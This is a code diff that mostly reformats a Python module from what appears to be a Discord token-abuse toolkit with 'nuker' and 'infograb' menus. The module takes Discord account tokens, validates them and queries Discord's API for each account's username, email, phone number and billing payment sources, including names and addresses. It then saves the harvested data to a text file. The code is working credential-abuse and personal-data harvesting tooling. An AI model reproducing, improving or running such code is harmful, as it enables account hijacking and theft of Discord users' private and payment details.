@@ -1,5 +1,6 @@
 from requests import get
 from .tokens import TokensTool
+
 # from messages import (
 #     exitMenu,
 #     infograbMenu,
@@ -11,6 +12,7 @@ from .tokens import TokensTool
 # )
 import messages
 from datetime import datetime
+
 
 class Info:
     def __init__(self) -> None:
@@ -29,12 +31,18 @@ class Info:
             if select == "1":
                 token = input("\nToken: ")
                 if self.tinfo.validToken(token, for_nuker=True) == "Valid.":
-                    headers = {"Authorization": token, "Content-Type": "application/json"}
+                    headers = {
+                        "Authorization": token,
+                        "Content-Type": "application/json",
+                    }
                     r = get(
-                        "https://canary.discordapp.com/api/v8/users/@me", headers=headers
+                        "https://canary.discordapp.com/api/v8/users/@me",
+                        headers=headers,
                     )
                     if r.status_code in messages.statuses:
-                        userName = r.json()["username"] + "#" + r.json()["discriminator"]
+                        userName = (
+                            r.json()["username"] + "#" + r.json()["discriminator"]
+                        )
                         userID = r.json()["id"]
                         phone = r.json()["phone"]
                         email = r.json()["email"]
@@ -59,8 +67,8 @@ class Info:
             User Name: {userName}
             User ID: {userID}
             Bio: {bio}
-            Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.{'gif' if avatar.startswith("a_" else 'png')}" if not avatar == "Default" else avatar}
-            Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.{'gif' if banner.startswith("a_" else 'png'}" if not banner == "Default" else banner}
+            Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.{'gif' if avatar.startswith('a_') else 'png'}" if not avatar == "Default" else avatar}
+            Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.{'gif' if banner.startswith('a_') else 'png'}" if not banner == "Default" else banner}
             Banner color: {banner_color}
             Locale: {locale}
             NSFW allowed? {nsfw}
@@ -121,7 +129,9 @@ class Info:
                             )
                             if r.status_code in messages.statuses:
                                 userName = (
-                                    r.json()["username"] + "#" + r.json()["discriminator"]
+                                    r.json()["username"]
+                                    + "#"
+                                    + r.json()["discriminator"]
                                 )
                                 userID = r.json()["id"]
                                 phone = r.json()["phone"]
@@ -143,12 +153,12 @@ class Info:
                                 nsfw = r.json()["nsfw_allowed"]
                                 verif = r.json()["verified"]
                                 info.append(
-                            f"""\n
+                                    f"""\n
             User Name: {userName}
             User ID: {userID}
             Bio: {bio}
-            Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.{'gif' if avatar.startswith("a_" else 'png')}" if not avatar == "Default" else avatar}
-            Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.{'gif' if banner.startswith("a_" else 'png'}" if not banner == "Default" else banner}
+            Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.{'gif' if avatar.startswith('a_') else 'png'}" if not avatar == "Default" else avatar}
+            Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.{'gif' if banner.startswith('a_') else 'png'}" if not banner == "Default" else banner}
             Banner color: {banner_color}
             Locale: {locale}
             NSFW allowed? {nsfw}
@@ -157,13 +167,16 @@ class Info:
             Verified? {verif}
             Phone Number: {phone if phone else 'None.'}
                         """
-                        )
+                                )
                                 req = get(
                                     "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                     headers={"Authorization": token},
                                 )
                                 grabreq = req.json()
-                                if req.status_code in messages.statuses and grabreq != []:
+                                if (
+                                    req.status_code in messages.statuses
+                                    and grabreq != []
+                                ):
                                     for grab in grabreq:
                                         grab1 = grab["billing_address"]
                                         name = grab1["name"]
@@ -217,7 +230,9 @@ class Info:
                     with open("!_valid_tokens_info.txt", "w") as token:
                         for toke in info:
                             token.write(f"{toke}\n")
-                    print("\nI save valid tokens info in `!_valid_tokens_info.txt` file.")
+                    print(
+                        "\nI save valid tokens info in `!_valid_tokens_info.txt` file."
+                    )
                 except IOError:
                     print(
                         "I can't find valid_tokens.txt file. You checked tokens in option 4?"
@@ -228,4 +243,3 @@ class Info:
             print("\nExit...")
         errorLog.close()
         input("\nPress key to continue.")
-
